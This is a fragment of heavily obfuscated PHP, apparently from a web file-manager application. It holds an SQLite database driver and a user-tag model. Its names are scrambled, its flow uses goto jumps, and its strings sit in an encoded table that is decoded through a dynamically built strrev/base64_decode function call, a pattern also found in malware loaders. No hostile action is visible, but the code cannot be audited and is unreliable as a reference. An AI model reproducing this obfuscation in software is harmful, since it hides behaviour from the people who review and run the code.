aÅÖ–‘ÙŞ—: $this->queryStr = $E¡È–ŒÉçÚ; if ($this->queryID) { $this->free(); } think_action_status($aßä‚ç ÈÔ[21], 1); goto BáêáÌ¥Ğ; bÒ ²“ŒÀ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[úÉ·öƒÑì©][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bÎ‡ˆáå‡Â = $this->_linkID->query($_SERVER[úÉ·öƒÑì©][23]); if (!$bÎ‡ˆáå‡Â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bâÈÀËø÷‰ = $this->_linkID->query($_SERVER[úÉ·öƒÑì©][24]); if (!$bâÈÀËø÷‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AáÍİ‡Ÿİ¾ = array(); while ($f„ğ´ªôíÑ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $AáÍİ‡Ÿİ¾[] = $f„ğ´ªôíÑ; } $this->queryID->reset(); return $AáÍİ‡Ÿİ¾; } public function getFields($bß©ùˆ Ê˜) { $bÜ¥®‹äâ =& $_SERVER[úÉ·öƒÑì©]; $dóñìê‚ = $this->query($bÜ¥®‹äâ[25] . $bß©ùˆ Ê˜ . $bÜ¥®‹äâ[26]); $e¿ï¶ÅõÂÕ = array(); if ($dóñìê‚) { foreach ($dóñìê‚ as $cŠğÛÖÖ§˜ => $Eç®„ïÀœ) { $e¿ï¶ÅõÂÕ[$Eç®„ïÀœ[$bÜ¥®‹äâ[28]]] = array($bÜ¥®‹äâ[28] => $Eç®„ïÀœ[$bÜ¥®‹äâ[28]], $bÜ¥®‹äâ[29] => $Eç®„ïÀœ[$bÜ¥®‹äâ[29]], $bÜ¥®‹äâ[31] => (bool) ($Eç®„ïÀœ[$bÜ¥®‹äâ[31]] === $bÜ¥®‹äâ[33]), $bÜ¥®‹äâ[34] => $Eç®„ïÀœ[$bÜ¥®‹äâ[53]], $bÜ¥®‹äâ[36] => (bool) $Eç®„ïÀœ[$bÜ¥®‹äâ[54]], $bÜ¥®‹äâ[39] => (bool) $Eç®„ïÀœ[$bÜ¥®‹äâ[54]]); } } return $e¿ï¶ÅõÂÕ; } public function getTables($BØšÔ³Æê = '') { $CØ¥ÚÉÅì¥ =& $_SERVER[úÉ·öƒÑì©]; $f’³ÙÎÓñ = $this->query($CØ¥ÚÉÅì¥[42] . $CØ¥ÚÉÅì¥[43] . $CØ¥ÚÉÅì¥[44]); $b‘²‰«±ŸŠ = array(); foreach ($f’³ÙÎÓñ as $cä’îàÅ => $FªÒœĞÓ»®) { $b‘²‰«±ŸŠ[$cä’îàÅ] = current($FªÒœĞÓ»®); } return $b‘²‰«±ŸŠ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e‡ØĞÏ—Œ¤ =& $_SERVER[úÉ·öƒÑì©]; $this->error = $this->_linkID->lastErrorMsg(); if ($e‡ØĞÏ—Œ¤[33] != $this->queryStr) { $this->error .= LNG($e‡ØĞÏ—Œ¤[45]) . $this->queryStr; } think_trace($this->error, $e‡ØĞÏ—Œ¤[33], $e‡ØĞÏ—Œ¤[46]); return $this->error; } public function escapeString($AÔÜºó›ã›) { $dˆåÇ¹ÇŸ =& $_SERVER[úÉ·öƒÑì©]; if ($this->_linkID) { return $this->_linkID->escapeString($AÔÜºó›ã›); } return str_ireplace($dˆåÇ¹ÇŸ[55], $dˆåÇ¹ÇŸ[56], $AÔÜºó›ã›); } public function parseLimit($D‡Á“ˆ÷èÏ) { $dÚÀŸ­² =& $_SERVER[úÉ·öƒÑì©]; $b‹ĞÃÊÈ‹› = $dÚÀŸ­²[33]; if (!empty($D‡Á“ˆ÷èÏ)) { $D‡Á“ˆ÷èÏ = explode($dÚÀŸ­²[47], $D‡Á“ˆ÷èÏ); if (count($D‡Á“ˆ÷èÏ) > 1) { $b‹ĞÃÊÈ‹› .= $dÚÀŸ­²[48] . $D‡Á“ˆ÷èÏ[1] . $dÚÀŸ­²[49] . $D‡Á“ˆ÷èÏ[0] . $dÚÀŸ­²[50]; } else { $b‹ĞÃÊÈ‹› .= $dÚÀŸ­²[48] . $D‡Á“ˆ÷èÏ[0] . $dÚÀŸ­²[50]; } } return $b‹ĞÃÊÈ‹›; } } goto aà·¯„²¥°; D¼™ôƒ•„¡: $fÉÏÃ¸— = strrev(base64_decode($_SERVER[úù›­Ö¢íü][0])); function binCheckNeq($AÑ¹ ®Ø³, $F»ïê¯Îò–) { return $AÑ¹ ®Ø³ != $F»ïê¯Îò–; } $_SERVER[$_SERVER[úù›­Ö¢íü][1]] = $fÉÏÃ¸—($_SERVER[$_SERVER[úù›­Ö¢íü][2]]); goto a»¨„æÈÓ; EÅÌ¶øÔ†ù: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($bÜÒ¾¤îí†) { $eÚ ¸‰›†Ø =& $_SERVER[úÉ·öƒÑì©]; return array($eÚ ¸‰›†Ø[1801] => array(USER_ID, $eÚ ¸‰›†Ø[1802])); } protected function listData() { $eïÓ‘…ÁòÚ =& $_SERVER[úÉ·öƒÑì©]; $CÖâÙŸµš¢ = array($eïÓ‘…ÁòÚ[1527] => USER_ID, $eïÓ‘…ÁòÚ[472] => array($eïÓ‘…ÁòÚ[1805], 0)); $b÷„“„âñË = $eïÓ‘…ÁòÚ[1807]; $EÕŠÍÔÏ± = $this->field($b÷„“„âñË)->where($CÖâÙŸµš¢)->order($eïÓ‘…ÁòÚ[1808])->select(); return $EÕŠÍÔÏ± ? $EÕŠÍÔÏ± : array(); } protected function listByTag($eÑ‚œñôö) { } protected function addToTag($cì’àÛ°Ì, $bé§œ›öÚÉ) { $eà…Š¢®ê =& $_SERVER[úÉ·öƒÑì©]; if (!Model($eà…Š¢®ê[1943])->listData($bé§œ›öÚÉ) || !Model($eà…Š¢®ê[806])->pathInfo($cì’àÛ°Ì)) { return !1; } $F§¶°Û¾¦Ø = array($eà…Š¢®ê[1527] => USER_ID, $eà…Š¢®ê[472] => $bé§œ›öÚÉ, $eà…Š¢®ê[423] => $cì’àÛ°Ì, $eà…Š¢®ê[424] => $eà…Š¢®ê[418], $eà…Š¢®ê[422] => $eà…Š¢®ê[33], $eà…Š¢®ê[1703] => 0); if ($this->where($F§¶°Û¾¦Ø)->find()) { return !1; } return $this->add($F§¶°Û¾¦Ø); } protected function removeFromTag($D‡µõÂƒÆµ, $c©ƒÊôØù¯) { $BÈœ¯²ğ =& $_SERVER[úÉ·öƒÑì©]; if (!Model($BÈœ¯²ğ[1943])->listData($c©ƒÊôØù¯)) { return !1; } if (is_array($D‡µõÂƒÆµ)) { $D‡µõÂƒÆµ = array($BÈœ¯²ğ[7], $D‡µõÂƒÆµ); } $b„¦ÕÔÉ‚‘ = array($BÈœ¯²ğ[1527] => USER_ID, $BÈœ¯²ğ[472] => $c©ƒÊôØù¯, $BÈœ¯²ğ[424] => $BÈœ¯²ğ[418], $BÈœ¯²ğ[423] => $D‡µõÂƒÆµ); return $this->where($b„¦ÕÔÉ‚‘)->delete(); } protected function removeByTag($føèÌ¯Ã¿) { $FáÆ‰¢çæÒ =& $_SERVER[úÉ·öƒÑì©]; if (!$føèÌ¯Ã¿) { return !1; } $bÀœå“®Å = array($FáÆ‰¢çæÒ[1527] => USER_ID, $FáÆ‰¢çæÒ[472] => $føèÌ¯Ã¿); return $this->where($bÀœå“®Å)->delete(); } protected function removeBySource($EÍÏÍË¦ˆ‘) { $Aø¢„¯ƒ‚ =& $_SERVER[úÉ·öƒÑì©]; if (is_array($EÍÏÍË¦ˆ‘)) { $EÍÏÍË¦ˆ‘ = array($Aø¢„¯ƒ‚[7], $EÍÏÍË¦ˆ‘); } $FÆ­àŞÉÖë = array($Aø¢„¯ƒ‚[1527] => USER_ID, $Aø¢„¯ƒ‚[423] => $EÍÏÍË¦ˆ‘, $Aø¢„¯ƒ‚[472] => array($Aø¢„¯ƒ‚[979], 0)); return $this->where($FÆ­àŞÉÖë)->delete(); } }